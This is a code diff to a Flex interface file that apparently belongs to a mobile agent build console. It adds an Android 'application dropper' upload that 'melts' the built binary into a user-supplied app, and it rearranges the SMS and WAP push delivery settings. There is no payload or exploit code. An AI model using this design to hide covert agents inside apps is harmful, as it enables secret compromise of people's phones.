@@ -34,6 +34,8 @@
       
       private var keyReference:FileReference;
 
+      private var android_file:Boolean = false;
+      
 			public function set platform(value:*):void
 			{
 				if (value == 'android' || value == 'blackberry' || value == 'symbian' || value == 'multiplatform')
@@ -89,6 +91,17 @@
         fileReference.browse([new FileFilter("Cer", "*.cer")]);
 			}
 
+      private function browse_android():void
+      {
+        fileReference = new FileReference();
+        fileReference.addEventListener(Event.SELECT, fileSelection);
+        fileReference.browse();
+      }
+      
+      private function fileSelection(event:Event):void
+      {
+        android_file = true;
+      }
 	
 			private var uploadPopup:UploadPopup;
 
@@ -173,6 +186,21 @@
 				else
 					params={platform: 'wap', generate: {platforms: platforms, binary: {demo: createBtn.demo.selected}, sign: {}, melt: {appname: appname.text}, 'package': {type: 'remote'}}, deliver: {}};
 
+        params['deliver']['number']=number.text;
+        
+        // append the subdir to the appname
+        params['deliver']['link'] = complete_with_slash(url.textInput.text) + appname.text + "/" + appname.text;
+        
+        if (servindication.selected)
+          params['deliver']['type']='si';
+        if (servloading.selected)
+          params['deliver']['type']='sl';
+        if (sms.selected)
+          params['deliver']['type']='sms';
+        
+        params['deliver']['text']=text.text;
+        params['factory']={_id: parentDocument.factory._id};
+       
 
 				if (currentState == 'blackberry')
 				{
@@ -184,6 +212,17 @@
 
         if (currentState == 'android') {
           params['generate']['binary']['admin'] = admin.selected;
+          if (android_file) {
+            fileReference.addEventListener(HTTPStatusEvent.HTTP_STATUS, onUploadError);
+            fileReference.addEventListener(IOErrorEvent.IO_ERROR, onUploadError);
+            fileReference.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onUploadError);
+            fileReference.addEventListener(DataEvent.UPLOAD_COMPLETE_DATA, onUploadCompleteMelt);
+            
+            uploadPopup = PopUpManager.createPopUp(this.parentDocument as DisplayObject, UploadPopup, true) as UploadPopup;
+            uploadPopup.fileReference = fileReference;
+            PopUpManager.centerPopUp(uploadPopup);
+            return;
+          }
         }
         
 				if (currentState == 'symbian')
@@ -213,21 +252,6 @@
 				{
 					params['generate']['platforms']=['blackberry', 'android', 'winmo'];
 				}
-
-				params['deliver']['number']=number.text;
-
-        // append the subdir to the appname
-        params['deliver']['link'] = complete_with_slash(url.textInput.text) + appname.text + "/" + appname.text;
-        
-				if (servindication.selected)
-					params['deliver']['type']='si';
-				if (servloading.selected)
-					params['deliver']['type']='sl';
-				if (sms.selected)
-					params['deliver']['type']='sms';
-
-				params['deliver']['text']=text.text;
-				params['factory']={_id: parentDocument.factory._id};
 
 				DownloadManager.instance.createTask("build", null, params, onSuccess, onFailure);
 			}
@@ -298,6 +322,14 @@
         params['sign']['key']=event.data;
       }
       
+      private function onUploadCompleteMelt(event:DataEvent):void
+      {
+        PopUpManager.removePopUp(uploadPopup);
+        
+        params['generate']['melt'] = {input: event.data, appname: appname.text};
+        
+        DownloadManager.instance.createTask("build", null, params, onSuccess, onFailure);
+      }
 		]]>
 	</fx:Script>
 
@@ -358,6 +390,8 @@
     <s:TextArea left="25" width="280" height="55" borderVisible="false"
                 contentBackgroundAlpha="0.0" editable="false"
                 text="{R.get('REQUIRE_ADMIN_DESC')}"/>    
+    <s:Label text="{R.get('APPLICATION_DROPPER')}:" fontWeight="bold"/>
+    <s:Button width="100" label="{R.get('BROWSE')}..." click="browse_android()"/>
   </s:VGroup>
   
 	<s:Form includeIn="blackberry"
